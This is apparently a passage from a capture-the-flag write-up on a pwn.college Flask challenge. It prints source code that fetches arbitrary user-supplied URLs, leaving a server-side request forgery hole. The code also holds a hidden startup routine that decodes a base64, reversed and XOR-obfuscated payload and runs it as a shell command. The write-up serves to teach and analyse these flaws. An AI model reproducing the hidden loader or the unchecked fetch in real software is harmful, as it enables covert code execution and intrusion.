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</span><span class="sh">'</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="k">return</span> <span class="sh">'''</span><span class="s">
    &lt;!DOCTYPE html&gt;
    &lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;Zardus</span><span class="sh">'</span><span class="s"> Naughty List&lt;/title&gt;
        &lt;style&gt;
            body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; }
            h1 { color: #c41e3a; }
            form { margin-top: 30px; }
            label { display: block; margin-top: 15px; font-weight: bold; }
            input[type=</span><span class="sh">"</span><span class="s">text</span><span class="sh">"</span><span class="s">] { width: 100%; padding: 8px; margin-top: 5px; }
            input[type=</span><span class="sh">"</span><span class="s">submit</span><span class="sh">"</span><span class="s">] { margin-top: 20px; padding: 10px 20px; background-color: #c41e3a; color: white; border: none; cursor: pointer; }
            input[type=</span><span class="sh">"</span><span class="s">submit</span><span class="sh">"</span><span class="s">]:hover { background-color: #a01729; }
        &lt;/style&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;h1&gt;Zardus</span><span class="sh">'</span><span class="s"> pwn.college Naughty List&lt;/h1&gt;
        &lt;p&gt;Have you been naughty or nice? Check if you</span><span class="sh">'</span><span class="s">re on Zardus</span><span class="sh">'</span><span class="s"> pwn.college naughty list!&lt;/p&gt;

        &lt;form action=</span><span class="sh">"</span><span class="s">/check</span><span class="sh">"</span><span class="s"> method=</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="s">&gt;
            &lt;label for=</span><span class="sh">"</span><span class="s">hacker_name</span><span class="sh">"</span><span class="s">&gt;Hacker Name:&lt;/label&gt;
            &lt;input type=</span><span class="sh">"</span><span class="s">text</span><span class="sh">"</span><span class="s"> id=</span><span class="sh">"</span><span class="s">hacker_name</span><span class="sh">"</span><span class="s"> name=</span><span class="sh">"</span><span class="s">hacker_name</span><span class="sh">"</span><span class="s"> required&gt;

            &lt;label for=</span><span class="sh">"</span><span class="s">hacker_image</span><span class="sh">"</span><span class="s">&gt;Hacker Image URL (optional):&lt;/label&gt;
            &lt;input type=</span><span class="sh">"</span><span class="s">text</span><span class="sh">"</span><span class="s"> id=</span><span class="sh">"</span><span class="s">hacker_image</span><span class="sh">"</span><span class="s"> name=</span><span class="sh">"</span><span class="s">hacker_image</span><span class="sh">"</span><span class="s"> placeholder=</span><span class="sh">"</span><span class="s">https://example.com/image.jpg</span><span class="sh">"</span><span class="s">&gt;

            &lt;input type=</span><span class="sh">"</span><span class="s">submit</span><span class="sh">"</span><span class="s"> value=</span><span class="sh">"</span><span class="s">Check Naughty List</span><span class="sh">"</span><span class="s">&gt;
        &lt;/form&gt;
    &lt;/body&gt;
    &lt;/html&gt;
    </span><span class="sh">'''</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/check</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">check</span><span class="p">():</span>
    <span class="n">hacker_name</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">hacker_name</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>
    <span class="n">hacker_image_url</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">hacker_image</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>

    <span class="c1"># Validate hacker_name is provided
</span>    <span class="k">if</span> <span class="ow">not</span> <span class="n">hacker_name</span><span class="p">:</span>
        <span class="nf">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="n">description</span><span class="o">=</span><span class="sh">"</span><span class="s">Hacker name is required</span><span class="sh">"</span><span class="p">)</span>

    <span class="c1"># Check if hacker is on the naughty list
</span>    <span class="n">is_naughty</span> <span class="o">=</span> <span class="n">hacker_name</span> <span class="ow">in</span> <span class="n">NAUGHTY_LIST</span>

    <span class="c1"># Fetch hacker image if provided
</span>    <span class="n">image_data_uri</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">if</span> <span class="n">hacker_image_url</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">hacker_image_url</span><span class="p">)</span>
            <span class="n">image_content</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">content</span>
            <span class="c1"># Create data URI from image content
</span>            <span class="n">encoded_image</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">image_content</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">encoded_image</span> <span class="o">=</span> <span class="n">DEFAULT_IMAGE</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">encoded_image</span> <span class="o">=</span> <span class="n">DEFAULT_IMAGE</span>
    
    <span class="n">image_data_uri</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">data:image/png;base64,</span><span class="si">{</span><span class="n">encoded_image</span><span class="si">}</span><span class="sh">"</span>

    <span class="c1"># Build response
</span>    <span class="n">result_html</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'''</span><span class="s">
    &lt;!DOCTYPE html&gt;
    &lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;Naughty List Result&lt;/title&gt;
        &lt;style&gt;
            body 
            h1 
            .result 
            .naughty 
            .nice 
            img 
            a 
        &lt;/style&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;h1&gt;Naughty List Result&lt;/h1&gt;
        &lt;div class=</span><span class="sh">"</span><span class="s">result </span><span class="si">{</span><span class="sh">'</span><span class="s">naughty</span><span class="sh">'</span> <span class="k">if</span> <span class="n">is_naughty</span> <span class="k">else</span> <span class="sh">'</span><span class="s">nice</span><span class="sh">'</span><span class="si">}</span><span class="sh">"</span><span class="s">&gt;
            &lt;h2&gt;</span><span class="si">{</span><span class="n">hacker_name</span><span class="si">}</span><span class="s">&lt;/h2&gt;
            &lt;p&gt;&lt;strong&gt;Status:&lt;/strong&gt; </span><span class="si">{</span><span class="sh">'</span><span class="s">NAUGHTY üòà</span><span class="sh">'</span> <span class="k">if</span> <span class="n">is_naughty</span> <span class="k">else</span> <span class="sh">'</span><span class="s">NICE üòÅ</span><span class="sh">'</span><span class="si">}</span><span class="s">&lt;/p&gt;
            </span><span class="si">{</span><span class="sa">f</span><span class="sh">'</span><span class="s">&lt;img src=</span><span class="sh">"</span><span class="si">{</span><span class="n">image_data_uri</span><span class="si">}</span><span class="sh">"</span><span class="s"> alt=</span><span class="sh">"</span><span class="n">Hacker</span> <span class="n">Image</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">'</span><span class="s"> if image_data_uri else </span><span class="sh">''</span><span class="si">}</span><span class="s">
        &lt;/div&gt;
        &lt;a href=</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="s">&gt;üîô Back to form&lt;/a&gt;
    &lt;/body&gt;
    &lt;/html&gt;
    </span><span class="sh">'''</span>

    <span class="k">return</span> <span class="n">result_html</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">PAYLOAD</span><span class="p">:</span>
        <span class="n">decoded</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">PAYLOAD</span><span class="p">)</span>
        <span class="n">reversed_bytes</span> <span class="o">=</span> <span class="n">decoded</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
        <span class="n">unpacked</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">b</span> <span class="o">^</span> <span class="mh">0x42</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">reversed_bytes</span><span class="p">)</span>
        <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">unpacked</span><span class="p">.</span><span class="nf">decode</span><span class="p">(),</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
</pre></table></code></div></div></details><p>On the surface, this is a simple Flask application:</p><ul><li><p>A Flask web app on <code class="language-plaintext highlighter-rouge">/</code></p><li><p>A form with:</p><ul><li><p><code class="language-plaintext highlighter-rouge">hacker_name</code> (required)</p><li><p><code class="language-plaintext highlighter-rouge">hacker_image</code> (optional image URL)</p></ul><li><p><code class="language-plaintext highlighter-rouge">/check</code>:</p><ul class="nolineno"><li>Checks if <code class="language-plaintext highlighter-rouge">hacker_name</code> is in a hardcoded <code class="language-plaintext highlighter-rouge">NAUGHTY_LIST</code><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far 